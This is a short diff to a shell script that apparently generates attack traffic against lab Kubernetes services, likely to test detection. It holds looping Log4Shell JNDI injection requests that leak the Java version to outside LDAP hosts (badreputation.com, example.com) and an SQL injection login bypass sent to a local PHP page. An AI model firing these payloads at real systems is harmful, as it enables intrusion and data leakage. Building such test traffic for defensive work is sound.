@@ -13,4 +13,7 @@ while true; do curl -v -X GET "http://log4j-victim.default.svc:8983/solr/admin/c
 
 while true; do curl -v -X GET "http://database.default.svc:80/" -H 'User-Agent: ${jndi:ldap://${sys:java.version}.badreputation.com}'; sleep $((RANDOM % 15)); done
 
+while true; do curl --get --data-urlencode 'action=${jndi:ldap://${sys:java.version}.example.com}' http://database.default.svc:80/; sleep $((RANDOM % 15)); done
+
+
 curl -X POST 'http://192.168.1.225/index.php' --data-raw 'nombre_usuario=1%27+OR+%271%27%3D%271%27%23&password=aaadf'
